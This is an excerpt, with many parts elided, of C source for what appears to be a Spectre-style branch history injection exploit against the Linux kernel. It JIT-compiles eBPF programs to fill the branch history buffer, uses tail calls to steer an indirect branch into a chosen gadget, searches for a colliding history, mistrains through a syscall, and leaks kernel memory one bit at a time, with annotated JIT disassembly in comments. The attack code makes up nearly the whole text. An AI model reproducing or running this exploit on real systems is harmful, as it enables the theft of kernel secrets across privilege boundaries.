...
//externs
extern void fixed_bhb(uint64_t syscall_nr,
...
void find_colliding_history() {
    ...
    map_set(map_jmptable, 0, fd_gadget_hist);   //Indirect branch in eBPF will execute gadget_hist

    //Jit a program to randomize BHB value and then perform an indirect branch
    //
	//0xffffffffc00ea727:  push   rbp                   
	//0xffffffffc00ea728:  mov    rbp,rsp               
	//0xffffffffc00ea72b:  push   rax                   
	//0xffffffffc00ea72c:  push   r13                   
	//0xffffffffc00ea72e:  push   r14                   
	//0xffffffffc00ea730:  mov    r14,rdi               
	//0xffffffffc00ea733:  movabs rsi,0xffff88810388d910		;map_history
	//0xffffffffc00ea73d:  movzx  rax,BYTE PTR [rsi+0x0]		;128 jumps to randomize BHB value
	//0xffffffffc00ea742:  test   rax,rax               
	//0xffffffffc00ea745:  je     0xffffffffc00ea747    
	//0xffffffffc00ea747:  movzx  rax,BYTE PTR [rsi+0x1]
	//0xffffffffc00ea74c:  test   rax,rax               
	//0xffffffffc00ea74f:  je     0xffffffffc00ea751    
	//0xffffffffc00ea751:  movzx  rax,BYTE PTR [rsi+0x2]
	//0xffffffffc00ea756:  test   rax,rax               
	//0xffffffffc00ea759:  je     0xffffffffc00ea75b    
	//0xffffffffc00ea75b:  movzx  rax,BYTE PTR [rsi+0x3]
	//0xffffffffc00ea760:  test   rax,rax               
	//0xffffffffc00ea763:  je     0xffffffffc00ea765    
	//...
	//0xffffffffc00eac33:  movzx  rax,BYTE PTR [rsi+0x7f]        
	//0xffffffffc00eac38:  test   rax,rax                        
	//0xffffffffc00eac3b:  je     0xffffffffc00eac3d             
	//0xffffffffc00eac3d:  mov    rdi,r14                        
	//0xffffffffc00eac40:  movabs rsi,0xffff88810388dc00		;map_jmptable         
	//0xffffffffc00eac4a:  mov    r13d,DWORD PTR [r14+0x70]		;packet length      
	//0xffffffffc00eac4e:  and    r13,0x1                        
	//0xffffffffc00eac52:  mov    rdx,r13                        
	//0xffffffffc00eac55:  mov    edx,edx                        
	//0xffffffffc00eac57:  cmp    DWORD PTR [rsi+0x24],edx      ;check in bound of jmp_table 
	//0xffffffffc00eac5a:  jbe    0xffffffffc00eac8c             
	//0xffffffffc00eac5c:  mov    eax,DWORD PTR [rbp-0x4]        
	//0xffffffffc00eac62:  cmp    eax,0x20                      ;tail_call ensure no more than 32 nested call 
	//0xffffffffc00eac65:  ja     0xffffffffc00eac8c             
	//0xffffffffc00eac67:  add    eax,0x1                        
	//0xffffffffc00eac6a:  mov    DWORD PTR [rbp-0x4],eax        
	//0xffffffffc00eac70:  mov    rcx,QWORD PTR [rsi+rdx*8+0x110]
	//0xffffffffc00eac78:  test   rcx,rcx                        
	//0xffffffffc00eac7b:  je     0xffffffffc00eac8c             
	//0xffffffffc00eac7d:  pop    r14                            
	//0xffffffffc00eac7f:  pop    r13                            
	//0xffffffffc00eac81:  pop    rax                            
	//0xffffffffc00eac82:  mov    rcx,QWORD PTR [rcx+0x30]       
	//0xffffffffc00eac86:  add    rcx,0xb                        
	//0xffffffffc00eac8a:  jmp    rcx                         	;indirect branch   
	//0xffffffffc00eac8c:  xor    eax,eax                        
	//0xffffffffc00eac8e:  pop    r14                            
	//0xffffffffc00eac90:  pop    r13                            
	//0xffffffffc00eac92:  leave                                 
	//0xffffffffc00eac93:  ret                                   
	insns_len = 0;
	memset(insns, 0, sizeof(insns));
	//Save context in reg 8
	insns[insns_len++] = BPF_MOV64_REG(BPF_REG_8, BPF_REG_1);
	//Get random history map
	insns[insns_len++] = BPF_RAW_INSN(BPF_LD|BPF_DW|BPF_IMM, BPF_REG_2, 2, 0, map_history);
	insns[insns_len++] = BPF_RAW_INSN(0, 0, 0, 0, 0);
	//Perform MAX_HISTORY_SIZE jmps to fill the bhb
	for(int i=0; i<MAX_HISTORY_SIZE; i++) {
		insns[insns_len++] = BPF_LDX_MEM(BPF_B, BPF_REG_0, BPF_REG_2, i);
		insns[insns_len++] = BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 0);
	}
	//Indirect call using the tail_call helper
	//Use packet length as jmp table index
	insns[insns_len++] = BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_8);
	insns[insns_len++] = BPF_RAW_INSN(BPF_LD|BPF_DW|BPF_IMM, BPF_REG_ARG2, 1, 0, map_jmptable);
	insns[insns_len++] = BPF_RAW_INSN(0, 0, 0, 0, 0);
	insns[insns_len++] = BPF_LDX_MEM(BPF_W, BPF_REG_7, BPF_REG_8, 0);
	insns[insns_len++] = BPF_ALU64_IMM(BPF_AND, BPF_REG_7, 1);
	insns[insns_len++] = BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_7);
	insns[insns_len++] = BPF_EMIT_CALL(BPF_FUNC_tail_call);
	//Exit
	insns[insns_len++] = BPF_MOV64_IMM(BPF_REG_0, 0);
	insns[insns_len++] = BPF_EXIT_INSN();

	fd_fill_bhb = prog_load(insns, insns_len);
	sock_fill_bhb = create_filtered_socket_fd(fd_fill_bhb);
	trigger_ebpf(sock_fill_bhb, 1);
    ...
    if(strlen(colliding_history) == MAX_HISTORY_SIZE) {
        ...
        found = 1;
        map_set_ptr(map_history, 0, history);
    }
    while(!found)
    {
        round++;
        ...
        for(int j=0; j<ITER; j++)
        {
            ...
            trigger_ebpf(sock_fill_bhb, 0); //ind branch in eBPF to desdired gadget
            fixed_bhb(SYSCALL_MISTRAIN, 1, 0, 0, 0); //try to hit 1 transiently
...
void jit_leak_gadget() {
    ...
    map_set(map_jmptable, 0, fd_gadget_leak);   //Indirect branch in eBPF will execute gadget_leak
}
    ...
    *n_hits = 0;
    ...
    for(int bit_pos=0; bit_pos<8; bit_pos++) {
        ...
        for(int j=0; j<ITER; j++)
        {
            ...
            trigger_ebpf(sock_fill_bhb, 0); //ind branch in eBPF to desdired gadget
            fixed_bhb(SYSCALL_MISTRAIN, bit_pos, 0, 0, addr-0x14); //leak biy at bit_pos
...
int main(int argc, char **argv)
{
    ...
    map_jmptable        = map_jmptable_create(1);
    map_history         = map_array_create(sizeof(uint8_t)*MAX_HISTORY_SIZE, 1);
